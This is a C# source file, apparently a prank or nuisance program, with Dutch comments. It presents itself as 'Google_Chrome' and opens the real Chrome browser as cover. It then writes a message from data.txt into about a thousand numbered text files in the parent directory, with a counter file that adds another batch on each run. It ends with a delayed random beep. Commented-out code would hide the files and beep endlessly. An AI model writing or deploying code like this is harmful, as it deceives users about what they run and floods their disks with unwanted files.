using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace Google_Chrome
{
    class Program
    {
        static void Main(string[] args)
        {
            string strFileName = "data.txt";
            string strCMD = "Ms.txt";
            string strPath = "../";


            int intCount = 1;
            var msg = File.ReadAllLines(strFileName);
            int intAmountOfDocs = 1000;
            string strMsg = File.ReadAllText(strCMD);
            Console.WriteLine(strMsg);

            Process.Start(@"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe");
            //Piepjescode
            /*
            int beep = 50;

            do
            {
                Console.Beep(beep , 100);
                beep = beep + 100;
                if (beep >= 13000)
                {
                    do
                    {
                        Console.Beep(beep, 100);
                        beep = beep - 100;
                    } while (beep >= 150);
                }
            } while (true);
            */

            if (!File.Exists("filecheck.dat"))
            {
                File.WriteAllText("filecheck.dat", "1");
            }


            string strFileCheck = File.ReadAllLines("filecheck.dat").Last();
            int intFileCheck = Convert.ToInt32(strFileCheck);
            int intFileSet = Convert.ToInt32(strFileCheck);
            intFileCheck += intAmountOfDocs;
            if (intFileCheck < intAmountOfDocs - 1)
            {

            }
            else
            {
                intAmountOfDocs = intFileCheck;
            }
            File.WriteAllText("filecheck.dat", Convert.ToString(intAmountOfDocs));



            //Dit is voor loop1, er moet nog een 2e loop gemaakt worden die alleen activeert zodra dat de files al bestaan.
            intCount = intFileSet;
            do
            {
                File.WriteAllLines(strPath + intCount + ".txt", msg);
                //File.SetAttributes(strPath + intCount + ".txt", FileAttributes.Hidden);
                intCount++;

            } while (intCount < intAmountOfDocs);
            Random a = new Random();
            int randa = a.Next(50, 10000);
            Random b = new Random();
            int randb = b.Next(200,2000);
            Random c = new Random();
            int randc = c.Next(10000, 100000);
            Thread.Sleep(randc);
            Console.Beep(randa , randb);
        }
    }
}

